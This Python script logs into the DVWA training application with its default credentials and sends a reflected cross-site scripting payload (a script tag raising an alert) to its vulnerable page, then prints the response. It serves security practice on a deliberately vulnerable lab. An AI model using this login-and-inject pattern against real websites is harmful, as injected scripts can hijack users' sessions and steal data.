import requests
from bs4 import BeautifulSoup

def login_to_dvwa(base_url, username, password):
    session = requests.Session()
    login_page = session.get(base_url + '/login.php')
    soup = BeautifulSoup(login_page.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']

    data = {
        'username': username,
        'password': password,
        'Login': 'Login',
        'user_token': user_token
    }
    response = session.post(base_url + '/login.php', data=data)

    if 'Login failed' in response.text:
        print("Failed to login to DVWA.")
        return None
    return session.cookies.get('PHPSESSID')

def run_xxs_reflected_attack(dvwa_url, session_cookie=None):
    target_url = f"{dvwa_url}/vulnerabilities/xss_r/"
    headers = {}

    if session_cookie:
        headers['Cookie'] = f'PHPSESSID={session_cookie}; security=low'
    else:
        # Default DVWA credentials
        session_cookie = login_to_dvwa(dvwa_url, 'admin', 'password')
        if session_cookie is None:
            return
        headers['Cookie'] = f'PHPSESSID={session_cookie};'

    # XSS payload - a simple JavaScript alert for demonstration
    xss_payload = "<script>alert('XSS');</script>"

    # Parameters for GET request
    params = {
        'name': xss_payload
    }

    # Sending the GET request with the XSS payload
    response = requests.get(target_url, params=params, headers=headers)

    # Print the response text
    print(response.text)